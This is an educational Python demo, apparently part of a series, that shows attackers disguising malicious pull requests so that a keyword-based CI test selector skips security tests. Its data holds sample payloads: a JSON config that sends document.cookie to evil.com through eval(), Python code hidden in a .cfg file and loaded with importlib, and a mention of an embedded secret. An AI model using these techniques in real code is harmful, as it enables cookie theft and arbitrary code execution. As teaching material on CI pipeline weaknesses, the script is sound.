#!/usr/bin/env python3
"""
Step 2: Attacker Tricks AI Into Skipping Security Tests

Attacker carefully crafts commit messages and file names to make
the AI classify dangerous changes as "low-risk."

Author: AmitK
License: MIT License
Disclaimer: For educational and demonstration purposes only.
"""

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'


class AITestSelector:
    """Same AI selector from step 1."""
    RULES = {
        'skip_tests': {'file_patterns': ['.md', '.txt', '.rst', '.css', '.html'],
                       'keywords': ['readme', 'docs', 'documentation', 'typo', 'comment', 'formatting']},
        'smoke_only': {'file_patterns': ['.yaml', '.yml', '.json', '.toml', '.ini', '.cfg'],
                       'keywords': ['config', 'setting', 'format', 'display']},
        'full_security': {'keywords': ['auth', 'login', 'password', 'token', 'api', 'database']},
    }

    def classify_change(self, files_changed, commit_message):
        commit_lower = commit_message.lower()
        skip_extensions = self.RULES['skip_tests']['file_patterns']
        if all(any(f.endswith(ext) for ext in skip_extensions) for f in files_changed):
            if any(kw in commit_lower for kw in self.RULES['skip_tests']['keywords']):
                return 'skip_tests', 'Low risk: documentation/formatting only'
        config_extensions = self.RULES['smoke_only']['file_patterns']
        if all(any(f.endswith(ext) for ext in config_extensions) for f in files_changed):
            return 'smoke_only', 'Config change: smoke tests sufficient'
        if any(kw in commit_lower for kw in self.RULES['full_security']['keywords']):
            return 'full_security', 'Security-relevant: full scan required'
        return 'integration_only', 'Standard code change'


# Attacker's crafted PRs
MALICIOUS_PRS = [
    {
        'title': 'Attack 1: Hide code change as documentation',
        'commit_message': 'Update README documentation formatting',
        'files_changed': ['README.md', 'docs/api_reference.md'],
        'hidden_payload': 'docs/api_reference.md actually contains embedded Python (polyglot file)\nwith SQL injection in the API example that gets copy-pasted by developers',
        'real_risk': 'Developers copy vulnerable code from "docs"',
    },
    {
        'title': 'Attack 2: Rename .py to .cfg and import',
        'commit_message': 'Update service configuration settings',
        'files_changed': ['config/service_settings.cfg', 'config/routes.yaml'],
        'hidden_payload': 'service_settings.cfg is actually Python code imported via:\nimport importlib.util; spec = importlib.util.spec_from_file_location("cfg", "config/service_settings.cfg")',
        'real_risk': 'Arbitrary code execution via config file import',
    },
    {
        'title': 'Attack 3: Embed secrets in CSS comments',
        'commit_message': 'Fix CSS formatting and typo in stylesheet',
        'files_changed': ['static/styles.css', 'templates/base.html'],
        'hidden_payload': 'CSS file contains: /* api-key: sk-prod-real-key-here */\nHTML template contains an exfiltration script in a hidden div',
        'real_risk': 'Secret leakage + XSS via template injection',
    },
    {
        'title': 'Attack 4: Backdoor in "display config"',
        'commit_message': 'Update display config format for new UI',
        'files_changed': ['config/ui_display.json'],
        'hidden_payload': 'JSON config includes: {"on_load": "fetch(https://evil.com/collect?data="+document.cookie)"}\nProcessed by frontend JavaScript eval()',
        'real_risk': 'XSS cookie theft via config-driven eval',
    },
]


def run_attack():
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}{RED}  💀 ATTACKER: Bypassing AI Test Selection{RESET}")
    print(f"{BOLD}{'='*60}{RESET}\n")

    selector = AITestSelector()

    print(f"  {CYAN}Attacker knows the AI's rules. They craft PRs to look 'safe'.{RESET}\n")

    bypassed = 0

    for i, pr in enumerate(MALICIOUS_PRS, 1):
        level, reason = selector.classify_change(pr['files_changed'], pr['commit_message'])

        is_bypassed = level in ('skip_tests', 'smoke_only')

        print(f"  {BOLD}{'─'*55}{RESET}")
        print(f"  {BOLD}PR #{i}: {pr['title']}{RESET}")
        print(f"  {'─'*55}")
        print(f"    Commit: \"{pr['commit_message']}\"")
        print(f"    Files:  {pr['files_changed']}")
        print(f"    AI Decision: ", end='')

        if is_bypassed:
            print(f"{GREEN}✅ {level.upper()}{RESET} — \"{reason}\"")
            print(f"    {RED}SECURITY TESTS: SKIPPED!{RESET}")
            print(f"\n    {RED}Hidden payload:{RESET}")
            for line in pr['hidden_payload'].split('\n'):
                print(f"      {RED}{line}{RESET}")
            print(f"    {RED}Real risk: {pr['real_risk']}{RESET}")
            bypassed += 1
        else:
            print(f"{RED}❌ {level.upper()}{RESET} — caught!")
        print()

    print(f"  {BOLD}{'═'*55}{RESET}")
    print(f"  {BOLD}{RED}  BYPASS RESULTS:{RESET}")
    print(f"  {BOLD}{'═'*55}{RESET}")
    print(f"    PRs that bypassed security: {RED}{bypassed}/{len(MALICIOUS_PRS)}{RESET}")
    print(f"    Security tests skipped:     {RED}{bypassed} times{RESET}")
    print(f"    Vulnerabilities undetected:  {RED}{bypassed}{RESET}")
    print(f"  {BOLD}{'═'*55}{RESET}")

    print(f"\n{YELLOW}  Next: Run '3_vulnerability_ships.py' to see production impact{RESET}\n")


if __name__ == "__main__":
    run_attack()
